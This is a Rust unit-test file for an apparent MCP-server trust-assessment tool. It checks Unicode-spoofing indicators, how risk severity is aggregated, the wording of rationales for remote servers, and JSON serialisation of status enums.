    fn trust_home_fixture_unicode_servers_classify_as_expected() {
        let root = std::path::Path::new("../../tests/fixtures/trust-home");
        let items = etherfence_inventory::discover(root);
        let cursor = items
            .iter()
            .find(|i| i.agent == etherfence_core::AgentKind::Cursor)
            .expect("trust-home cursor fixture");

        let bidi = cursor
            .mcp_servers
            .iter()
            .find(|s| s.name.contains('\u{202e}'))
            .expect("bidi-control fixture server");
        assert!(assess_trust(bidi)
            .indicators
            .iter()
            .any(|i| i.id == "EF-TRUST-UNI-001"));

        let confusable = cursor
            .mcp_servers
            .iter()
            .find(|s| s.name == "confusable-alias-server")
            .expect("confusable-alias-server fixture");
        assert!(assess_trust(confusable)
            .indicators
            .iter()
            .any(|i| i.id == "EF-TRUST-UNI-004"));

        let negative = cursor
            .mcp_servers
            .iter()
            .find(|s| s.name == "ascii-negative-control")
            .expect("ascii-negative-control fixture");
        assert!(assess_trust(negative)
            .indicators
            .iter()
            .all(|i| i.category != IndicatorCategory::UnicodeIdentity));
    }
}

#[cfg(test)]
mod foundational_tests {
    use super::*;

    fn indicator(id: &str, severity: Severity, category: IndicatorCategory) -> TrustIndicator {
        TrustIndicator {
            id: id.to_string(),
            severity,
            category,
            summary: "summary".to_string(),
            rationale: "rationale".to_string(),
            evidence: Vec::new(),
            remediation: "remediation".to_string(),
        }
    }

    #[test]
    fn aggregate_is_configuration_risk_first_across_full_cross_product() {
        use ArtifactIdentityConfidence::*;
        use ConfigurationRiskStatus::*;

        let cases: [(
            ArtifactIdentityConfidence,
            ConfigurationRiskStatus,
            AggregateAssessmentStatus,
        ); 9] = [
            (
                VerifiedLocal,
                NoKnownIndicators,
                AggregateAssessmentStatus::VerifiedLocal,
            ),
            (
                VerifiedLocal,
                NeedsReview,
                AggregateAssessmentStatus::NeedsReview,
            ),
            (VerifiedLocal, HighRisk, AggregateAssessmentStatus::HighRisk),
            (
                KnownSource,
                NoKnownIndicators,
                AggregateAssessmentStatus::KnownSource,
            ),
            (
                KnownSource,
                NeedsReview,
                AggregateAssessmentStatus::NeedsReview,
            ),
            (KnownSource, HighRisk, AggregateAssessmentStatus::HighRisk),
            (
                Unknown,
                NoKnownIndicators,
                AggregateAssessmentStatus::Unknown,
            ),
            (Unknown, NeedsReview, AggregateAssessmentStatus::NeedsReview),
            (Unknown, HighRisk, AggregateAssessmentStatus::HighRisk),
        ];

        for (artifact, risk, expected) in cases {
            assert_eq!(
                aggregate(artifact, risk),
                expected,
                "artifact={artifact:?} risk={risk:?}"
            );
        }
    }

    #[test]
    fn needs_review_true_for_needs_review_high_risk_and_unknown_only() {
        assert!(!needs_review(AggregateAssessmentStatus::VerifiedLocal));
        assert!(!needs_review(AggregateAssessmentStatus::KnownSource));
        assert!(needs_review(AggregateAssessmentStatus::NeedsReview));
        assert!(needs_review(AggregateAssessmentStatus::HighRisk));
        assert!(needs_review(AggregateAssessmentStatus::Unknown));
    }

    #[test]
    fn configuration_risk_from_indicators_escalates_by_severity_and_presence() {
        assert_eq!(
            configuration_risk_from_indicators(&[]),
            ConfigurationRiskStatus::NoKnownIndicators
        );
        assert_eq!(
            configuration_risk_from_indicators(&[indicator(
                "EF-TRUST-X-001",
                Severity::Low,
                IndicatorCategory::EnvironmentVariable
            )]),
            ConfigurationRiskStatus::NeedsReview
        );
        assert_eq!(
            configuration_risk_from_indicators(&[indicator(
                "EF-TRUST-X-002",
                Severity::High,
                IndicatorCategory::ShellWrapper
            )]),
            ConfigurationRiskStatus::HighRisk
        );
    }

    #[test]
    fn sort_indicators_orders_by_canonical_category_then_id() {
        let mut indicators = vec![
            indicator(
                "EF-TRUST-ENV-002",
                Severity::Low,
                IndicatorCategory::EnvironmentVariable,
            ),
            indicator(
                "EF-TRUST-OBS-001",
                Severity::High,
                IndicatorCategory::ObscuredLaunch,
            ),
            indicator(
                "EF-TRUST-ENV-001",
                Severity::Low,
                IndicatorCategory::EnvironmentVariable,
            ),
            indicator(
                "EF-TRUST-PIN-001",
                Severity::Medium,
                IndicatorCategory::PackagePinning,
            ),
        ];
        sort_indicators(&mut indicators);
        let ids: Vec<&str> = indicators.iter().map(|i| i.id.as_str()).collect();
        assert_eq!(
            ids,
            [
                "EF-TRUST-OBS-001",
                "EF-TRUST-PIN-001",
                "EF-TRUST-ENV-001",
                "EF-TRUST-ENV-002",
            ]
        );
    }

    /// User Story 3's core "no conflation" guarantee (spec FR-006/FR-007,
    /// Acceptance Scenario US3-1): a verified-local artifact identity
    /// combined with a high-risk configuration indicator must yield a
    /// `high-risk` Aggregate while the artifact identity itself is never
    /// overwritten. Provable here with synthetic inputs, with no
    /// dependency on real npx/wrapper/path parsing from any other story.
    #[test]
    fn verified_local_artifact_with_high_risk_configuration_never_conflated() {
        let risk = configuration_risk_from_indicators(&[indicator(
            "EF-TRUST-SHW-001",
            Severity::High,
            IndicatorCategory::ShellWrapper,
        )]);
        assert_eq!(risk, ConfigurationRiskStatus::HighRisk);

        let artifact = ArtifactIdentityConfidence::VerifiedLocal;
        let status = aggregate(artifact, risk);
        assert_eq!(status, AggregateAssessmentStatus::HighRisk);
        // artifact identity itself remains VerifiedLocal — never overwritten,
        // it is simply not what determined the aggregate this time.
        assert_eq!(artifact, ArtifactIdentityConfidence::VerifiedLocal);
        assert!(needs_review(status));
    }

    #[test]
    fn known_source_identity_with_unpinned_version_and_risky_wrapper_is_needs_review() {
        let risk = configuration_risk_from_indicators(&[
            indicator(
                "EF-TRUST-PIN-002",
                Severity::Medium,
                IndicatorCategory::PackagePinning,
            ),
            indicator(
                "EF-TRUST-SHW-002",
                Severity::Medium,
                IndicatorCategory::ShellWrapper,
            ),
        ]);
        assert_eq!(risk, ConfigurationRiskStatus::NeedsReview);
        let status = aggregate(ArtifactIdentityConfidence::KnownSource, risk);
        assert_eq!(status, AggregateAssessmentStatus::NeedsReview);
    }

    #[test]
    fn assess_trust_stub_returns_safe_defaults_for_stdio_and_remote() {
        let stdio = McpServer {
            name: "example".to_string(),
            command: Some("some-tool".to_string()),
            args: Vec::new(),
            env: Vec::new(),
            url: None,
        };
        let stdio_assessment = assess_trust(&stdio);
        assert_eq!(
            stdio_assessment.artifact_identity,
            ArtifactIdentityConfidence::Unknown
        );
        assert_eq!(
            stdio_assessment.aggregate,
            AggregateAssessmentStatus::Unknown
        );
        assert!(stdio_assessment.invocation.applicable);
        assert!(stdio_assessment.indicators.is_empty());

        let remote = McpServer {
            name: "hosted".to_string(),
            command: None,
            args: Vec::new(),
            env: Vec::new(),
            url: Some("https://example.invalid/mcp".to_string()),
        };
        let remote_assessment = assess_trust(&remote);
        assert!(!remote_assessment.invocation.applicable);
        assert_eq!(
            remote_assessment.executable_path,
            ExecutablePathClassification::NotApplicable
        );
        assert_eq!(remote_assessment.sha256, None);
        assert_eq!(
            remote_assessment.artifact_identity,
            ArtifactIdentityConfidence::Unknown
        );
    }

    /// FR-057c: a remote server's `unknown` artifact identity MUST be
    /// accompanied by rationale text explicitly stating this reflects "no
    /// local invocation to assess," distinct from a stdio server whose
    /// `unknown` reflects an inconclusive local inspection.
    #[test]
    fn remote_server_artifact_identity_rationale_states_no_local_invocation() {
        let remote = McpServer {
            name: "hosted".to_string(),
            command: None,
            args: Vec::new(),
            env: Vec::new(),
            url: Some("https://example.invalid/mcp".to_string()),
        };
        let a = assess_trust(&remote);
        assert!(a
            .artifact_identity_rationale
            .contains("no local invocation to assess"));

        // A stdio server that is merely inconclusive must use different,
        // non-remote-specific wording — the two `unknown` cases are not
        // interchangeable.
        let stdio = McpServer {
            name: "example".to_string(),
            command: Some("some-tool".to_string()),
            args: Vec::new(),
            env: Vec::new(),
            url: None,
        };
        let stdio_assessment = assess_trust(&stdio);
        assert_eq!(
            stdio_assessment.artifact_identity,
            ArtifactIdentityConfidence::Unknown
        );
        assert!(!stdio_assessment
            .artifact_identity_rationale
            .contains("no local invocation to assess"));
    }

    #[test]
    fn json_tokens_are_kebab_case() {
        assert_eq!(
            serde_json::to_string(&ArtifactIdentityConfidence::VerifiedLocal).unwrap(),
            "\"verified-local\""
        );
        assert_eq!(
            serde_json::to_string(&ConfigurationRiskStatus::NoKnownIndicators).unwrap(),
            "\"no-known-indicators\""
        );
        assert_eq!(
            serde_json::to_string(&AggregateAssessmentStatus::HighRisk).unwrap(),
            "\"high-risk\""
        );
        assert_eq!(
            serde_json::to_string(&PackageRunner::PipxRun).unwrap(),
            "\"pipx-run\""
        );
        assert_eq!(
            serde_json::to_string(&ShellWrapperKind::PowershellEncodedCommand).unwrap(),
            "\"powershell-encoded-command\""
        );
    }
}
